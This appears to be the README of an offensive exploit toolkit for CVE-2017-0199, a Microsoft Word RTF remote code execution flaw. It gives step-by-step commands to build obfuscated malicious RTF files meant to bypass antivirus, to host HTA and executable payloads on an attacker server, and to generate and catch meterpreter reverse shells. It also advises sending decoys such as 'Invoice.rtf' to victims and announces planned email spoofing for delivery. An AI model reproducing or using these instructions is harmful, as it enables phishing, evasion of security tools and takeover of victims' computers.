## Exploit toolkit CVE-2017-0199 - v3.0

Exploit toolkit CVE-2017-0199 - v3.0 is a handy python script which provides a quick and effective way to exploit Microsoft RTF RCE. It could generate a malicious (Obfuscated) RTF file and deliver metasploit / meterpreter / other payload to victim without any complex configuration.

### Video tutorial (for v2.0)

### Release note:

Introduced following capabilities to the script

	- Generate Malicious Obfuscated RTF file ( using -x option ) to bypass AV
Detection rate before obfuscation

Detection rate after obfuscation:

	- Deliver custom HTA file ( using -H option )

Version: Python version 2.7.13

### Future release:

Working on following feature

	- Automatically send generated malicious RTF to victim using email spoofing
		
### Example:

- Step 1: Generate malicious obfuscated RTF file using following command and send it to victim

    	Syntax:
    
    	# python cve-2017-0199_toolkit.py -M gen -w <filename.rtf> -u <http://attacker.com/test.hta> -x 1
    
    	Example:
    
    	# python cve-2017-0199_toolkit.py -M gen -w Invoice.rtf -u http://192.168.56.1/logo.doc -x 1
    
    
- Step 2 (Optional, if using MSF Payload) : Generate metasploit payload and start handler
    
    	Example:
    
    	Generate Payload:
	
    	# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe > /tmp/shell.exe
	
        Start Handler:
	
        # msfconsole -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.1; run"
	
    
- Step 3: Start toolkit in exploitation mode to deliver payloads
    
    	Syntax:
    
    	# python cve-2017-0199_toolkit.py -M exp -e <http://attacker.com/shell.exe> -l </tmp/shell.exe>
    
    	Example:
    
    	# python cve-2017-0199_toolkit.py -M exp -e http://192.168.56.1/shell.exe -l /tmp/shell.exe
    
    
    
### Command line arguments:

    # python cve-2017-0199_toolkit.py -h

    This is a handy toolkit to exploit CVE-2017-0199 (Microsoft Word RTF RCE)

    Modes:

    -M gen                                          Generate Malicious RTF file only

         Generate malicious RTF file:

          -w <Filename.rtf>                   Name of malicious RTF file (Share this file with victim).

          -u <http://attacker.com/test.hta>   The path to an hta file. Normally, this should be a domain or IP where        this                                          tool is running.
	                                      For example, http://attackerip.com/test.hta (This URL will be included in 	                                              malicious RTF file and will be requested once victim will open malicious RTF file.
          -x 0|1  (default = 0)               Generate obfuscated RTF file. 0 = Disable, 1 = Enable.

					      
    -M exp                                          Start exploitation mode

         Exploitation:
	 
          -H </tmp/custom.hta>                Local path of a custom HTA file which needs to be delivered and executed on target.
          -p <TCP port:Default 80>            Local port number.

          -e <http://attacker.com/shell.exe>  The path of an executable file / meterpreter shell / payload  which needs to be executed on target.

          -l </tmp/shell.exe>                 Local path of an executable file / meterpreter shell / payload (If payload is hosted locally).
